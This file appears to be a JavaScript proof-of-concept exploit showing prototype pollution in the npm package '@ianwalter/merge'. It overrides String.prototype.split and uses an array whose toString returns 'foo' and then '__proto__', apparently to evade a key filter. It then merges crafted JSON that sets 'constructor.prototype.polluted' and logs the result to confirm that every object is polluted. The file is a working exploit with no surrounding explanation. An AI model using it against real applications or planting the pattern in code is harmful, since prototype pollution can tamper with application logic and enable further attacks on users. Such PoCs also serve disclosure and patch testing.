var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const merge = require('@ianwalter/merge');
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
merge({}, EVIL_JSON);
console.log({}.polluted);